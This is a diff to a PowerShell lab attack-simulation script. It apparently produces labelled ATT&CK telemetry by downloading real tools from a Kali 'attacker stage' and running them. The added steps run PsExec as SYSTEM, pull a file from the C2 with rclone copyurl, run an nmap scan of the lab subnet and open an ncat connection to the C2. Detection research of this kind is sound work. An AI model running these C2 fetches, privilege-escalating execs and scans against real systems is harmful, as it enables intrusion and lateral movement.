@@ -64,12 +64,36 @@ $toolsDir   = "C:\Users\Public\tools"            # where the downloaded tool mar
 $legacyTool = "C:\Users\Public\downloaded_tool.bin"
 $taskName   = "UpdaterSync"                        # persistence artefact; cleanup-all.ps1 deletes this name
 $mysql      = "C:\xampp\mysql\bin\mysql.exe"       # XAMPP MariaDB client (DVWA backend)
-# INERT markers named like common hacker tools (IOC realism, NOT real binaries). Keep in sync with
-# TOOL_NAMES in tools/launch_exploit.py.
-$toolNames  = @("mimikatz.exe","psexec.exe","nc.exe","nmap.exe","rclone.exe")
+# Real benign tool binaries downloaded from the Kali stage and EXECUTED below (the signal is the tool's
+# process + sockets, not file content). When the stage only has a marker, the download still writes a file
+# and the exec is skipped gracefully. Keep in sync with TOOL_NAMES in tools/launch_exploit.py.
+$toolNames  = @("nmap.exe","ncat.exe","PsExec64.exe","rclone.exe")
 # Loud internal scan targets: the lab subnet + the Kali box, common service ports.
 $scanHosts  = (1..50 | ForEach-Object { "10.21.3.$_" }) + @("10.21.4.30")
 $scanPorts  = 22,80,443,445,3306,3389,8000
+
+# Run a staged tool with a HARD timeout so a hung or absent binary never stalls the chain. Only executes
+# a REAL PE (file starts with 'MZ'); a served inert marker (text) is detected and the exec is skipped.
+# $ToolArgs is passed verbatim. Returns $true if the process was started.
+function Invoke-ToolWithTimeout {
+    param([string]$Path, [string[]]$ToolArgs = @(), [int]$TimeoutSec = 30)
+    if (-not (Test-Path $Path)) { Write-Warning "tool missing: $Path (skip)"; return $false }
+    try {
+        $fs = [System.IO.File]::OpenRead($Path)
+        $b0 = $fs.ReadByte(); $b1 = $fs.ReadByte(); $fs.Close()
+        if ($b0 -ne 0x4D -or $b1 -ne 0x5A) { Write-Warning "marker not a real binary: $Path (skip exec)"; return $false }
+    } catch { return $false }
+    try {
+        $sp = @{ FilePath = $Path; NoNewWindow = $true; PassThru = $true }
+        if ($ToolArgs.Count -gt 0) { $sp.ArgumentList = $ToolArgs }
+        $p = Start-Process @sp
+        if (-not $p.WaitForExit($TimeoutSec * 1000)) {
+            try { $p.Kill() } catch {}
+            Write-Warning "tool timed out after ${TimeoutSec}s: $Path (killed)"
+        }
+        return $true
+    } catch { Write-Warning "tool failed: $Path - $($_.Exception.Message)"; return $false }
+}
 
 # READ-ONLY MySQL enumeration + credential dump (root has no password = the lab default, unsecured creds).
 # Each `& $mysql` is a short-lived mysql.exe child + a 127.0.0.1:3306 connection. No writes -> no cleanup.
@@ -142,11 +166,55 @@ Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
     -NetworkIndicators @("$($Attacker):$StagePort") `
     -Note "Download tooling (inert lab markers) from the attacker stage" -Action {
         New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
+        $ProgressPreference = 'SilentlyContinue'   # the IWR progress bar cripples large-file throughput
         foreach ($t in $toolNames) {
-            try { Invoke-WebRequest -Uri "$stageBase/$t" -OutFile (Join-Path $toolsDir $t) -UseBasicParsing -TimeoutSec 10 }
+            # 90 s: a real tool binary (e.g. rclone ~85 MB) is larger than the old marker.
+            try { Invoke-WebRequest -Uri "$stageBase/$t" -OutFile (Join-Path $toolsDir $t) -UseBasicParsing -TimeoutSec 90 }
             catch { Write-Warning "download $t failed - the connection attempt still produced NET telemetry" }
         }
         try { Invoke-WebRequest -Uri "$stageBase/tool.bin" -OutFile $legacyTool -UseBasicParsing -TimeoutSec 10 } catch {}
+    }
+
+# --- Execute the downloaded tools (the real signal: new unseen tool PROCESS + socket nodes) ----------
+# Each exec is timeout-guarded (Invoke-ToolWithTimeout) and runs ONLY if the download delivered a real PE
+# (a served marker is detected and skipped), so the chain never hangs or fails on a missing/marker tool.
+
+# PsExec as SYSTEM -> PsExec64.exe -> PSEXESVC.exe -> cmd.exe -> whoami.exe (a distinctive unseen tree).
+Invoke-LabeledStep -Technique "T1569.002" -Tactic "execution" `
+    -ProcessIndicators @("PsExec64.exe","PSEXESVC.exe","cmd.exe","whoami.exe") `
+    -Note "Run PsExec as SYSTEM (service exec) -> whoami" -Action {
+        Invoke-ToolWithTimeout -Path "$toolsDir\PsExec64.exe" `
+            -ToolArgs @("-accepteula","-nobanner","-s","cmd","/c","whoami") -TimeoutSec 30 | Out-Null
+    }
+
+# rclone pulls a file from the C2 stage (copyurl) -> unseen rclone.exe process + a NET fetch to the C2.
+Invoke-LabeledStep -Technique "T1105" -Tactic "command-and-control" `
+    -ProcessIndicators @("rclone.exe") `
+    -FileIndicators @("$toolsDir\pulled.bin") `
+    -NetworkIndicators @("$($Attacker):$StagePort") `
+    -Note "Run rclone copyurl to pull from the C2 stage" -Action {
+        Invoke-ToolWithTimeout -Path "$toolsDir\rclone.exe" `
+            -ToolArgs @("copyurl","$stageBase/tool.bin","$toolsDir\pulled.bin") -TimeoutSec 30 | Out-Null
+    }
+
+# Real nmap connect scan (best-effort; the TcpClient sweep above already carried the NET breadth). -sT -Pn
+# needs no Npcap driver. Skipped automatically if nmap.exe was not staged (marker -> no exec).
+Invoke-LabeledStep -Technique "T1046" -Tactic "discovery" `
+    -ProcessIndicators @("nmap.exe") `
+    -NetworkIndicators @("10.21.3.0/24","10.21.4.30") `
+    -Note "Real nmap -sT connect scan (best-effort)" -Action {
+        Invoke-ToolWithTimeout -Path "$toolsDir\nmap.exe" `
+            -ToolArgs @("-sT","-Pn","-n","--host-timeout","5s","-p","22,80,443,445,3306,3389,8000",
+                        "10.21.3.1-50","10.21.4.30") -TimeoutSec 120 | Out-Null
+    }
+
+# Real ncat connect to the C2 (best-effort; skipped if ncat.exe was not staged).
+Invoke-LabeledStep -Technique "T1071" -Tactic "command-and-control" `
+    -ProcessIndicators @("ncat.exe") `
+    -NetworkIndicators @("$($Attacker):$StagePort") `
+    -Note "Real ncat connect to the C2 (best-effort)" -Action {
+        Invoke-ToolWithTimeout -Path "$toolsDir\ncat.exe" `
+            -ToolArgs @("--recv-only","-w","3",$Attacker,"$StagePort") -TimeoutSec 15 | Out-Null
     }
 
 # --- MySQL attack (read-only enumeration + credential dump) -----------------------------------------
